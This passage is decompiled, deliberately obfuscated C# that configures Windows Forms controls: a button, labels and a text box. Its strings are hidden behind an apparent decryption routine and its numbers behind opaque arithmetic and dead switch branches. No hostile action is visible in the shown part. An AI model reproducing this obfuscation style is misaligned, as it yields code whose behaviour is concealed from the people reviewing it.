		switch (752951 - Marshal.SizeOf(typeof(ELEMENT_TYPE_CMOD_REQD)))
		{
		case 0:
			num190 = -87650;
			break;
		}
		int num191 = (checked(((num190 < -27612 - Convert.ToInt32("3113543", 8)) ? 1 : 0) != unchecked((nint)((Array)(object)string.Empty).LongLength) * 162956) ? (Marshal.SizeOf(typeof(LockOperations)) / 3488) : ((Convert.ToInt32("32011", 8) == 13321) ? 12411 : array2[189]));
		int num192 = default(int);
		switch (-280490 + (array2[190] - 187763))
		{
		case 0:
			num192 = 1;
			break;
		}
		array140[num189] = num191 << num192;
		int num193 = Marshal.SizeOf(typeof(IsTvOS));
		int num194 = default(int);
		switch (_003CModule_003E.ActivityOptions[Marshal.SizeOf(typeof(UseHebrewParsing))] / -481)
		{
		case 0:
			num194 = -346970;
			break;
		case 1:
			num194 = array2[43];
			break;
		case 2:
			num194 = -565030;
			break;
		}
		int num195 = num194;
		int num196 = Convert.ToInt32(char.ToString('1') + "0101" + "01011010100001", 2);
		array140[num193] = checked(num195 + num196);
		array140[sizeof(bool) << 1] = (byte)(TasksSetActivityIds + 997436) != 0;
		array140[3] = _003CModule_003E.Dequeue[(217386 << (int)array[3]) + -434769];
		_003CModule_003E.GetMaxByteCount(ref string_139, array140);
		((Control)m3).set_Name(string_139);
		Button m4 = M21;
		int num197 = Convert.ToInt32(char.ToString('f') + char.ToString('f') + "fffff1", 16) * (-1 * Marshal.SizeOf(typeof(UseHebrewParsing)));
		int num198 = array2[44];
		int num199 = default(int);
		switch (HexIntPtrType * Convert.ToInt32("11111111111111111111111111111111", 2))
		{
		case 0:
			num199 = -166396;
			break;
		case 1:
			num199 = Convert.ToInt32("37776263310", 8);
			break;
		case 2:
			num199 = -507958;
			break;
		}
		int width4 = checked(num197 * (num198 + num199));
		string text106 = char.ToString((char)_003CModule_003E.KeyValuePair__2[10]);
		string string_140 = string.Concat(char.ToString(array[95]), char.ToString('貦') + "貦貦");
		object[] array141 = new object[3];
		char c39 = (char)_003CModule_003E.ActivityOptions[1];
		array141[(uint)c39] = '䘍';
		array141[Convert.ToInt32("1011000011011011001110011111001", 2) / 1483578617] = false;
		array141[Convert.ToInt32("10", Convert.ToInt32("2", 16))] = checked(Convert.ToInt32("fff451ac", 16) - -783582);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_140, array141);
		string value7 = text106 + string_140;
		int num200 = array[96];
		((Control)m4).set_Size(new Size(width4, Convert.ToInt32(value7, num200 - (0x2FFF & IsFreeBSD))));
		((Control)M21).set_TabIndex((int)array4[Marshal.SizeOf(typeof(CallConvs))]);
		Button m5 = M21;
		string string_141 = "\uf143\uf161";
		object[] array142 = new object[array2[4]];
		array142[(_003CModule_003E.ActivityOptions[149] > 960015) ? (-192136) : 0] = Convert.ToInt32("11110" + "0010111", 2);
		array142[1] = (byte)get_PositiveInfinity != 0;
		array142[2] = (char)(-855566 - Convert.ToInt32("11111111111100100100101000110101", 2));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_141, array142);
		string text107 = string_141;
		int num201 = ((31612 >= _003CModule_003E.KeyValuePair__2[168]) ? 18340 : 32158);
		string text108 = char.ToString((char)num201);
		string string_142 = char.ToString((char)Convert.ToInt32("110010110110100", 2)) + char.ToString('旟') + "旱旭";
		object[] array143 = new object[Convert.ToInt32("5", Convert.ToInt32("1000", 2))];
		array143[0] = char.ToString('ϻ') + char.ToString('\u070e') + "ÎA";
		int num202 = default(int);
		switch (array2[1] % 250909)
		{
		case 0:
			num202 = 1;
			break;
		}
		array143[num202] = 820 << (int)((Array)(object)"\u032a\u0353").LongLength;
		array143[2] = false;
		array143[checked(-3 * Convert.ToInt32("ffffffff", 16))] = Convert.ToInt32("11" + "01" + "1001010", 2);
		array143[4] = 3290 % array2[191];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_142, array143);
		string string_143 = string.Concat(text107, text108 + string_142);
		object[] array144 = new object[_003CModule_003E.CalendarType[_003CModule_003E.KeyValuePair__2[5]] * get_CurrentUICulture];
		int num203 = (checked(_003CModule_003E.KeyValuePair__2[169] - -991511) | 0x40212) + -288274 / Convert.ToInt32("1", 2);
		string text109 = char.ToString(array4[Convert.ToInt32("137", 8) % Convert.ToInt32("26", 16)]);
		string text110 = char.ToString('Ą');
		string string_144 = char.ToString('½') + "\0\u009a";
		object[] array145 = new object[Convert.ToInt32("11", array[1])];
		array145[0] = 'N';
		array145[_003CModule_003E.ActivityOptions[array2[0]]] = ',';
		array145[checked(885878 + _003CModule_003E.KeyValuePair__2[170])] = string.Concat(char.ToString('\u0005'), char.ToString((char)((Array)(object)string.Empty).Length), char.ToString('\u0001') + char.ToString('\0') + "\0\0\u0002");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_144, array145);
		array144[num203] = string.Concat(text109, text110 + string_144);
		checked
		{
			int num204 = ((Convert.ToInt32("3777" + "7751531", Marshal.SizeOf(typeof(__c__DisplayClass0_6))) >= -552254) ? Convert.ToInt32("ff" + "fe81df", ((Array)(object)"\u0364\u0352\u0312\u035f\u0318\u036d\u0358\u0317\u031a\u030f\u036e\u034d\u0302\u0324\u033c\u032c").Length) : (-60656)) - -97826;
			int num205 = ((Convert.ToInt32(char.ToString('3') + char.ToString('7') + "777553016", 8) != -76274) ? array2[45] : (-580749));
			array144[num204] = num205 + Marshal.SizeOf(typeof(ASCIIEncodingSealed));
		}
		char c40 = (char)Convert.ToInt32("10", 2);
		int num206 = c40;
		string string_145 = "ꃸ";
		object[] array146 = new object[Convert.ToInt32(char.ToString('1') + "10", 2)];
		array146[array2[get_CurrencyGroupSeparator]] = (byte)checked(Convert.ToInt32("0", 8) * -109311) != 0;
		array146[1] = 28707;
		array146[2] = "\u08d7\u05b1";
		array146[Convert.ToInt32("fffffffd", 16) * Convert.ToInt32("11111111111111111111111111111111", 2)] = '\u1a62';
		array146[4] = (int)array[36];
		array146[Convert.ToInt32("5", Convert.ToInt32("10", 8))] = char.ToString('\t') + "Ž\u0004";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_145, array146);
		nint num207;
		string string_146;
		checked
		{
			num207 = num206 * unchecked((nint)((Array)(object)string_145).LongLength);
			string_146 = "ꃊ꒢";
		}
		char c41 = (char)array2[5];
		object[] array147 = new object[(uint)c41];
		array147[0] = "ᦻ㱡";
		array147[5 % Convert.ToInt32("2", 16)] = 4730;
		array147[Convert.ToInt32("2", 8)] = false;
		array147[Marshal.SizeOf(typeof(CharSetMask))] = (int)((uint)array[97] << 1);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_146, array147);
		array144[num207] = string_146;
		string string_147 = "ꇯꇯ";
		object[] array148 = new object[4];
		array148[checked(_003CModule_003E.KeyValuePair__2[171] + 785602)] = (byte)((nint)((Array)(object)string.Empty).LongLength & 1) != 0;
		array148[1] = string.Concat(char.ToString('.'), char.ToString('\u001b') + "!\u001a\a");
		char c42 = (char)_003CModule_003E.ActivityOptions[0];
		array148[(uint)c42] = array[Convert.ToInt32("45", 8)];
		array148[3] = 41254;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_147, array148);
		int num208 = Convert.ToInt32(string_147, checked(Convert.ToInt32("10", Convert.ToInt32("10", 2)) * 1));
		string string_148 = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(MayCorruptAppDomain))), "яя", char.ToString('я') + char.ToString('я') + "яяюююш");
		object[] array149 = new object[Convert.ToInt32(char.ToString('1') + "01", 2)];
		array149[0] = 847;
		char num209 = array[3];
		int num210 = default(int);
		switch (517109 + Convert.ToInt32("fff81c0b", 16))
		{
		case 0:
			num210 = 1;
			break;
		case 1:
			num210 = -480608;
			break;
		}
		array149[(uint)num209] = (byte)num210 != 0;
		array149[(nint)((Array)(object)"\u033d\u0301").LongLength] = Convert.ToInt32("11" + "10001", 2);
		array149[Convert.ToInt32("3", 8)] = '\u00af';
		array149[sizeof(uint)] = Marshal.SizeOf(typeof(__c__DisplayClass0_6));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_148, array149);
		array144[num208] = ~Convert.ToInt32(string_148, (5652 != array2[192]) ? 8 : 634138);
		_003CModule_003E.GetMaxByteCount(ref string_143, array144);
		((Control)m5).set_Text(string_143);
		Button m6 = M21;
		string string_149 = string.Concat(char.ToString('톣') + char.ToString('톣') + "톣톣", "톣톣" + "톣톣톣톣", "톣톣톣톢톢" + "톢톢톢톣톢톢톣톢톢톣톢톢톣톣톢톢톣");
		object[] array150 = new object[Convert.ToInt32("3", 16)];
		array150[0] = 0x11E2 | Convert.ToInt32("5962", 16);
		array150[1] = lpvarValue;
		array150[0 | Convert.ToInt32("10", 2)] = '墑';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_149, array150);
		int num211 = Convert.ToInt32(string_149, 2);
		string string_150 = string.Concat(char.ToString('얕'), char.ToString('없') + char.ToString('엀') + "얔얕");
		object[] array151 = new object[2];
		array151[0] = 4597;
		array151[Convert.ToInt32("1", Convert.ToInt32("10000", 2))] = array2[46];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_150, array151);
		((ButtonBase)m6).set_UseVisualStyleBackColor((byte)(num211 + Convert.ToInt32(string_150, Convert.ToInt32("10", 16))) != 0);
		((Control)M21).add_Click((System.EventHandler)LoadAssemblyAndGetFunctionPointer);
		((Control)AmbiguousMatchException).set_AutoSize((byte)HasFlagsAttribute != 0);
		Label ambiguousMatchException = AmbiguousMatchException;
		string text111 = char.ToString((char)array2[Marshal.SizeOf(typeof(EncodingCharBuffer))]);
		string string_151 = "㤄㤆";
		object[] array152 = new object[_003CModule_003E.get_PositiveSign[0]];
		array152[0] = 14;
		array152[1] = false;
		array152[sizeof(ushort)] = 6060;
		array152[(Convert.ToInt32("37777636763", 8) <= 839602) ? Convert.ToInt32("3", 8) : 932698] = -31403 * Convert.ToInt32("11111111111111111111111111111111", 2);
		array152[checked(Convert.ToInt32("fff0ef24", 16) + 987360)] = (char)(1362944125 / Convert.ToInt32("30135313", 8));
		array152[5] = checked(433863 - Marshal.SizeOf(typeof(JulianEra)));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_151, array152);
		string text112 = text111 + string_151;
		string text113 = char.ToString('굫');
		string string_152 = string.Concat(char.ToString('⒞'), char.ToString('ⓛ') + "⒮⒲");
		int num212 = Marshal.SizeOf(typeof(CharSetMask));
		object[] array153 = new object[num212];
		array153[get_PositiveInfinity] = (char)Convert.ToInt32(char.ToString('3') + "0032", 8);
		array153[1] = 22549;
		array153[Convert.ToInt32("37774735054", 8) + 804310] = (char)Convert.ToInt32("11" + "10" + "10000", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_152, array153);
		string string_153 = string.Concat(text112, text113 + string_152);
		int num213 = Convert.ToInt32("fffffffe", 16) / 1;
		char c43 = (char)Convert.ToInt32("0", 2);
		object[] array154;
		int num214;
		checked
		{
			array154 = new object[num213 * unchecked((int)(~(uint)c43))];
			num214 = ((array[98] <= -482560) ? (-752949) : Marshal.SizeOf(typeof(EnforceJapaneseEraYearRanges)));
		}
		int num216;
		if (checked(num214 + (Convert.ToInt32("11111111111111110111111010011110", 2) & -21761)) != ((0x384FE ^ Convert.ToInt32("3d6f3", 16)) | Convert.ToInt32(char.ToString('1') + char.ToString('4') + "1436", 8)))
		{
			int num215 = default(int);
			switch (_003CModule_003E.ActivityOptions[2] * Marshal.SizeOf(typeof(UseHebrewParsing)))
			{
			case 0:
				num215 = Convert.ToInt32(char.ToString('8') + "75d5", Convert.ToInt32("20", 8));
				break;
			case 1:
				num215 = -579127;
				break;
			}
			num216 = num215;
		}
		else
		{
			num216 = 0 % (Convert.ToInt32("11111111111111100101000101001011", 2) + 663064);
		}
		string text114 = char.ToString('x');
		string text115 = char.ToString('\u089f');
		string text116 = char.ToString('֍');
		string string_154 = "飿颹";
		object[] array155 = new object[Convert.ToInt32("1e", 16) % Convert.ToInt32("c", 16)];
		array155[(nint)((Array)(object)string.Empty).LongLength] = 12442;
		array155[12 >> Convert.ToInt32("11", 2)] = 19792;
		array155[(uint)array[1]] = 3204;
		array155[3] = 'ѡ';
		array155[_003CModule_003E.ActivityOptions[3]] = (byte)get_PositiveInfinity != 0;
		array155[5] = 2765;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_154, array155);
		array154[num216] = string.Concat(text114, text115 + text116 + string_154);
		string string_155 = "헠䙶";
		object[] array156 = new object[__9__64_0 + 787901];
		char c44 = (char)get_PositiveInfinity;
		array156[(uint)c44] = array[0];
		int num217 = Convert.ToInt32("1724", 8);
		array156[1] = (char)num217;
		array156[Marshal.SizeOf(typeof(ENODATA))] = array2[19];
		array156[3] = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(UInt32View))), char.ToString('\n') + "\u0002\u001d");
		array156[Convert.ToInt32("3fdda", 16) ^ 0x3FDDE] = string.Concat(char.ToString('㕍'), char.ToString((char)Convert.ToInt32("100111001111", 2)), char.ToString('ޓ') + char.ToString('ƞ') + "ӹ\u0086r");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_155, array156);
		array154[1] = string_155;
		_003CModule_003E.GetMaxByteCount(ref string_153, array154);
		((Control)ambiguousMatchException).set_Font(new Font(string_153, 8f, (FontStyle)((Array)(object)string.Empty).LongLength, (GraphicsUnit)3, (byte)SAKA));
		((Control)AmbiguousMatchException).set_ForeColor(SystemColors.Control);
		((Control)AmbiguousMatchException).set_Location(new Point(~checked(584339 - (Convert.ToInt32("1072564", 8) << 1)), (-829008 ^ SerializationInfo) * -2));
		Label ambiguousMatchException2 = AmbiguousMatchException;
		string string_156 = "ꂋꂆ";
		object[] array157 = new object[checked(-707201 + _003CModule_003E.KeyValuePair__2[172])];
		array157[Convert.ToInt32("0", 8) * -625476] = false;
		array157[1 & _003CModule_003E.ActivityOptions[2]] = (char)checked(623021 + _003CModule_003E.ActivityOptions[150]);
		array157[2] = 'ཇ';
		array157[(nint)((Array)(object)(char.ToString('\u0309') + "\u0352\u0353")).LongLength] = (char)checked(array2[108] * unchecked((int)array[92]));
		int num218 = default(int);
		switch ((nint)((Array)(object)string.Empty).LongLength * Marshal.SizeOf(typeof(MinScalar)))
		{
		case 0:
			num218 = 4;
			break;
		}
		array157[num218] = 17597;
		array157[Convert.ToInt32("5", 8)] = string.Concat("\u0ac4j", char.ToString('ǧ') + "Āp\u000e\u0006");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_156, array157);
		string text117 = string_156;
		string text118 = char.ToString('峏');
		string string_157 = char.ToString('췓') + "췚춃";
		object[] obj19 = new object[5]
		{
			Convert.ToInt32(char.ToString('2') + char.ToString('0') + "44", 8),
			null,
			null,
			null,
			null
		};
		int num219 = Convert.ToInt32("3061", 8);
		obj19[1] = num219;
		obj19[2] = Convert.ToInt32(char.ToString('1') + char.ToString('1') + "000", 2);
		obj19[checked(-271526 + Convert.ToInt32("424a9", 16))] = (byte)Convert.ToInt32("0", 16) != 0;
		obj19[4] = (char)checked(17239 * Convert.ToInt32("10", 2));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_157, obj19);
		string string_158 = string.Concat(text117, text118 + string_157);
		int num220 = _003CModule_003E.Dequeue[Convert.ToInt32("0", 2)];
		int num221 = default(int);
		switch (Marshal.SizeOf(typeof(OverlappedData)) % Marshal.SizeOf(typeof(ENODATA)))
		{
		case 0:
			num221 = -620259;
			break;
		case 1:
			num221 = 18;
			break;
		}
		object[] array158 = new object[num220 | array4[num221]];
		string string_159 = "兎";
		object[] array159 = new object[398 >> (int)array[9]];
		array159[(nint)((Array)(object)string.Empty).LongLength] = string.Concat("㚖ť", char.ToString('\u001d') + "u%\u0014\u0014");
		array159[Convert.ToInt32("1", 16)] = (char)Convert.ToInt32("101" + "011" + "1000100", 2);
		array159[_003CModule_003E.ActivityOptions[array2[1]]] = "Ȫ¶";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_159, array159);
		string value8 = string_159;
		string string_160 = "\ua4ce";
		object[] array160 = new object[3];
		array160[0] = 13550;
		array160[1] = char.ToString('倚') + "ᶇɭ";
		array160[Convert.ToInt32("0", 8) | 2] = (byte)((Array)(object)string.Empty).Length != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_160, array160);
		int num222 = Convert.ToInt32(value8, Convert.ToInt32(string_160, 16));
		char c45 = (char)(0 / (_003CModule_003E.KeyValuePair__2[174] | 0x110518C));
		array158[num222] = (byte)c45 != 0;
		int num223 = default(int);
		switch (AssemblyBuilderAccess / (Convert.ToInt32("1346" + "3144235", 8) / (Convert.ToInt32("0", 2) | 1)))
		{
		case 0:
			num223 = -1030622 ^ (-189272 / Convert.ToInt32("1", 16));
			break;
		case 1:
			num223 = Convert.ToInt32("11111" + "111111101010011000000101010", 2) ^ Convert.ToInt32("3777" + "5230053", Marshal.SizeOf(typeof(__c__DisplayClass0_6)));
			break;
		}
		int num224 = num223;
		int num227;
		int num228 = default(int);
		checked
		{
			int num225 = default(int);
			switch (unchecked((nint)((Array)(object)"\u031a\u0357").LongLength) * unchecked((nint)((Array)(object)"\u032e").LongLength))
			{
			case 0:
				num225 = Convert.ToInt32("2764710", 8);
				break;
			case 1:
				num225 = Marshal.SizeOf(typeof(UnmanagedMemoryAccessor));
				break;
			case 2:
				num225 = 48828;
				break;
			}
			int num226 = ((((num225 == 37714) ? 1 : 0) != array2[1]) ? (-995120) : unchecked(_003CModule_003E.ActivityOptions[151] - Marshal.SizeOf(typeof(get_MemberInfo))));
			array158[num224] = array6[num226];
			array158[(857319 >> (1 | array[6])) - 26789] = Marshal.SizeOf(typeof(AddOn));
			char privateScope = unchecked((char)PrivateScope);
			num227 = privateScope;
			switch (array2[1] * 626626)
			{
			case 0:
				num228 = 6;
				break;
			}
		}
		array158[num227 % (num228 | get_PositiveInfinity)] = 2674;
		string text119 = char.ToString('1');
		string string_161 = "樫樫";
		object[] array161 = new object[5];
		array161[get_PositiveInfinity] = '䠭';
		array161[5 % Convert.ToInt32("10", 2)] = 1200;
		array161[2] = 1416;
		array161[(nint)((Array)(object)"\u0318.\u032e\u0338\u0328\u0319\u0320\u0308.\u0352\u0312\u033c\u0344\u0345\u0312").LongLength % 6] = 'ɴ';
		array161[(nint)((Array)(object)"\u036b\u031b\u036b\u0365").LongLength * 1] = string.Concat(char.ToString('э'), char.ToString('ʒ'), char.ToString('ऋ') + "ԇQ");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_161, array161);
		int num229 = Convert.ToInt32(text119 + string_161, 2);
		string string_162 = "汦";
		object[] array162 = new object[3];
		array162[_003CModule_003E.KeyValuePair__2[175] ^ -626412] = 'ḧ';
		array162[Convert.ToInt32("1", 2)] = (int)array[Marshal.SizeOf(typeof(TryWriteInt32BigEndian))];
		array162[checked(Convert.ToInt32("fff2668d", 16) - Convert.ToInt32("fff2668b", 16))] = 1680997824 / Marshal.SizeOf(typeof(SpinWait));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_162, array162);
		string value9 = string_162;
		int fromBase5 = default(int);
		switch (checked(array2[193] + -380545))
		{
		case 0:
			fromBase5 = 836197;
			break;
		case 1:
			fromBase5 = 8;
			break;
		case 2:
			fromBase5 = Convert.ToInt32("de8e4", 16);
			break;
		}
		array158[num229] = 3519 << Convert.ToInt32(value9, fromBase5);
		_003CModule_003E.GetMaxByteCount(ref string_158, array158);
		((Control)ambiguousMatchException2).set_Name(string_158);
		Label ambiguousMatchException3 = AmbiguousMatchException;
		char c46 = (char)(-61 * Convert.ToInt32("37777777777", 8));
		uint width5 = (uint)c46 << (int)array4[1];
		string string_163 = "\ue698";
		object[] array163 = new object[(-72678 != _003CModule_003E.get_PositiveSign[167]) ? 537899 : 3];
		array163[0] = 37366;
		array163[1] = ((Convert.ToInt32("11111111111111111010000011001001", 2) >= Convert.ToInt32("b98fb", 16)) ? true : false);
		array163[sizeof(char)] = Marshal.SizeOf(typeof(GetExceptionPointers));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_163, array163);
		string value10 = string_163;
		string string_164 = string.Concat(char.ToString('䅥') + "䅃䄙", "䅾䅜", char.ToString('䄧') + "䅋䅴" + "䄡䄦䅙䄣䄧䄦䅗䄽");
		int num230 = _003CModule_003E.KeyValuePair__2[0];
		object[] array164 = new object[num230];
		array164[Convert.ToInt32("0", 16)] = 8517;
		checked
		{
			array164[-470394 + UMALQURA] = AddHighNarrowingUpper + -47872;
		}
		array164[array2[0]] = (byte)array[2] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_164, array164);
		((Control)ambiguousMatchException3).set_Size(new Size((int)width5, Convert.ToInt32(value10, ((Array)(object)string_164).Length)));
		((Control)AmbiguousMatchException).set_TabIndex(_003CModule_003E.LoadVector128[_003CModule_003E.LoadVector128[Marshal.SizeOf(typeof(LunarCalendar))]]);
		Label ambiguousMatchException4 = AmbiguousMatchException;
		string text120 = char.ToString('袀');
		string string_165 = string.Concat(char.ToString('逢'), char.ToString('逸') + char.ToString('逿') + "遭选逨逮逿");
		object[] array165 = new object[Convert.ToInt32(char.ToString('1') + "10", array2[0])];
		array165[checked(0 * Convert.ToInt32("37777725676", 8))] = false;
		char num231 = array[3];
		int num232 = ((Array)(object)"\u030e\u0318\u033c\u034d\u034f\u035c.\u036b\u0306\u031c\u036f\u0302\u035a\u035c\u033b\u0353\u0365").Length;
		array165[(uint)num231] = (char)num232;
		array165[2] = 8;
		array165[(nint)((Array)(object)(char.ToString('\u0343') + "\u0365\u0347")).LongLength] = string.Concat(char.ToString('\r'), char.ToString('\b') + "\u0002\u0003");
		array165[4] = 1502;
		array165[5] = (char)Convert.ToInt32("10" + char.ToString('0') + "1010000011", Marshal.SizeOf(typeof(ENODATA)));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_165, array165);
		string text121 = text120 + string_165;
		string text122 = char.ToString('袠');
		string string_166 = char.ToString('㘾') + "㘺㘧";
		object[] array166 = new object[__9__140_0 / 398575130];
		int num233 = Convert.ToInt32("0", 16);
		int configuredValueTaskAwaitable__ = ConfiguredValueTaskAwaitable__1;
		array166[num233] = configuredValueTaskAwaitable__;
		array166[1] = (char)Convert.ToInt32(char.ToString('7') + char.ToString('4') + "c6", 16);
		int num234 = ((Array)(object)"\u0359\u031e").Length;
		array166[num234] = (char)Marshal.SizeOf(typeof(GetFilename));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_166, array166);
		string text123 = string_166;
		string string_167 = string.Concat("꽧꽦", "꼨꽣", "꽭꽱" + "꼨꽡꽻꼲");
		object[] array167 = new object[5];
		array167[Convert.ToInt32("0", 8)] = 8942;
		array167[1] = Convert.ToInt32("10" + "100011", 2);
		array167[2] = array2[40];
		array167[3] = 396;
		int num235 = _003CModule_003E.get_PositiveSign[1];
		array167[4] = (char)num235;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_167, array167);
		string string_168 = string.Concat(text121, text122 + text123 + string_167);
		object[] array168 = new object[_003CModule_003E.LoadVector128[_003CModule_003E.ActivityOptions[152] % 134 >> -288896 - SetCustomAttribute]];
		string string_169 = "嬒";
		int num237;
		string string_170;
		object[] array170;
		checked
		{
			object[] array169 = new object[Convert.ToInt32("48b16", 16) + -297747];
			array169[0] = array2[194] | 0x1084;
			array169[1] = "ᆐὄ";
			int num236 = ((Convert.ToInt32("37777534676", 8) != array2[195]) ? 515695 : 2);
			array169[num236] = Convert.ToInt32("10" + "111" + "11001010", ((Array)(object)"\u0340\u0310").Length);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_169, array169);
			num237 = array6[Convert.ToInt32(string_169, array2[_003CModule_003E.KeyValuePair__2[4]])];
			string_170 = string.Concat(char.ToString('솗'), char.ToString('쇁') + "솕솕");
			array170 = new object[array2[6]];
			int num238 = Convert.ToInt32("125b1", 16) + _003CModule_003E.KeyValuePair__2[176];
			int num239 = array[99];
			array170[num238] = num239;
		}
		array170[Convert.ToInt32("1", Marshal.SizeOf(typeof(PrepareDelegate)))] = (byte)checked(780148 + Convert.ToInt32("11111111111101000001100010001100", 2)) != 0;
		array170[GetPrimaryAndSecondary / 961116618] = string.Concat(char.ToString('欍'), char.ToString('ᒧ'), char.ToString('\u000e') + char.ToString('ұ') + "ōÛŶ");
		array170[3] = 9791;
		array170[4] = 4723;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_170, array170);
		array168[num237] = (char)Convert.ToInt32(string_170, Convert.ToInt32(char.ToString('1') + "0000", array[1]));
		string string_171 = "\ue595";
		object[] array171 = new object[sizeof(float)];
		array171[0] = 39039;
		array171[1] = (byte)((nint)((Array)(object)string.Empty).LongLength << 22) != 0;
		array171[2] = 14469;
		char c47 = (char)Convert.ToInt32("3", 16);
		array171[(uint)c47] = _003CModule_003E.get_PositiveSign[168] ^ array2[196];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_171, array171);
		int num240 = array6[Convert.ToInt32(string_171, 8)];
		string string_172 = string.Concat(char.ToString('䨠') + "䨠䨠", "䨠䨠" + "䨠䨡" + "䨠䨠䨠䨠䨠䨠䨠");
		object[] array172 = new object[Convert.ToInt32("fff0d271", 16) + 994707];
		array172[0] = (byte)get_PositiveInfinity != 0;
		array172[Convert.ToInt32("1", 16) & 1] = 2886;
		array172[Convert.ToInt32("fff3f963", 16) ^ -788127] = 872;
		array172[3] = 15203;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_172, array172);
		array168[num240] = Convert.ToInt32(string_172, 2) & 0x3D73;
		_003CModule_003E.GetMaxByteCount(ref string_168, array168);
		((Control)ambiguousMatchException4).set_Text(string_168);
		TextBox overwriteExisting = OverwriteExisting;
		char c48 = (char)checked(-490229 - Convert.ToInt32("1111111" + "11111100" + "01000010011101000", 2));
		char red4 = c48;
		int num241 = get_ActivityId;
		int num242 = ((-54115 >= _003CModule_003E.KeyValuePair__2[41]) ? (-449365) : continuationAction);
		int green3 = num241 + num242;
		string string_173 = string.Concat(char.ToString('킿'), char.ToString('킼') + char.ToString('킿') + "킹킽킻킽");
		object[] array173 = new object[(nint)((Array)(object)"\u034e\u0326\u030b\u032e\u0330\u0367\u0313").LongLength & array2[3]];
		array173[get_PositiveInfinity] = 14607;
		array173[1] = Convert.ToInt32(char.ToString('8') + "be", 16);
		array173[Marshal.SizeOf(typeof(FractionalDigitsCount)) % 4] = _003CModule_003E.get_PositiveSign[49];
		array173[(uint)array[array2[6]]] = char.ToString(array[100]) + "ڐ'";
		array173[4] = string.Concat("\u0316ː", char.ToString('婟') + "ѿچβ");
		array173[_003CModule_003E.get_PositiveSign[2]] = (byte)(-635615 + Char) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_173, array173);
		((Control)overwriteExisting).set_BackColor(Color.FromArgb(red4, green3, Convert.ToInt32(string_173, 8) ^ 0x8A81A));
		TextBox overwriteExisting2 = OverwriteExisting;
		int num243 = ((-30760 - _003CModule_003E.ActivityOptions[153] != checked(Convert.ToInt32("37777763130", 8) * -3)) ? (-77349) : (-987654));
		int num244 = ((9136 > TypeCode) ? (-391172) : (-246187));
		TextBox overwriteExisting3;
		string string_174;
		checked
		{
			int num245 = default(int);
			switch (array2[197] - -736055)
			{
			case 0:
				num245 = 269416;
				break;
			case 1:
				num245 = -313822;
				break;
			}
			((TextBoxBase)overwriteExisting2).set_BorderStyle((BorderStyle)(num243 - unchecked(num244 - num245)));
			((Control)OverwriteExisting).set_ForeColor(SystemColors.Window);
			((Control)OverwriteExisting).set_Location(new Point(71, Marshal.SizeOf(typeof(EventSourceAttribute))));
			overwriteExisting3 = OverwriteExisting;
			string_174 = string.Concat(char.ToString('稘') + "稙稘", char.ToString('稘'), char.ToString('稘') + "稙稙" + "稘稘稘稙稘稙稘");
			object[] array174 = new object[array2[198] ^ 0x79349];
			array174[Convert.ToInt32("0", 8)] = 2887;
			array174[1] = 'Д';
			array174[2] = false;
			array174[3] = string.Concat(char.ToString('Ѕ'), char.ToString('\u200e'), char.ToString('㺅') + "«ǋɠ\u0360");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_174, array174);
		}
		string text124 = char.ToString((char)Convert.ToInt32(string_174, 2));
		string text125 = char.ToString((char)('⻤' & array[39]));
		string string_175 = "\udee8\udee4";
		object[] array175 = new object[4];
		array175[_003CModule_003E.ActivityOptions[Convert.ToInt32("1", 2)]] = char.ToString('Ÿ') + "\u0311ɶ";
		array175[Convert.ToInt32("11111111111100111101000010001001", 2) + 798584] = (char)checked(Convert.ToInt32("37774275502", 8) - -951543);
		array175[Convert.ToInt32("2", 16)] = '顣';
		array175[3] = Convert.ToInt32(char.ToString('5') + char.ToString('0') + "f6", 16);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_175, array175);
		string text126 = string_175;
		string string_176 = char.ToString('ꮍ') + char.ToString('ꮠ') + "ꮷ\uabfc";
		int num246 = ((cbSizeInstance > -330559) ? 4 : 211396);
		object[] array176 = new object[num246];
		int num247 = _003CModule_003E.ActivityOptions[1];
		array176[num247] = (byte)((true ? 1u : 0u) & (uint)Convert.ToInt32("0", 2)) != 0;
		array176[(nint)((Array)(object)"\u033a").LongLength] = (char)_003CModule_003E.KeyValuePair__2[Convert.ToInt32("2a", 16)];
		array176[Marshal.SizeOf(typeof(ENODATA))] = string.Concat("ᔦ\u0004", char.ToString('\u001f') + char.ToString('E') + "\u0003\t");
		array176[3] = "྿\u0e6c";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_176, array176);
		string string_177 = string.Concat(text124, text125, text126 + string_176);
		int num248 = (int)array[Convert.ToInt32("12", 16)] % (Marshal.SizeOf(typeof(InnerException)) + array2[200]);
		int num249;
		if (Convert.ToInt32("37776434017", 8) % -151546 > 359557 - Convert.ToInt32("2075417", 8))
		{
			num249 = 6;
		}
		else
		{
			int num250 = Convert.ToInt32("fffca59f", 16);
			num249 = num250;
		}
		object[] array177 = new object[num248 % num249];
		string string_178 = "봹";
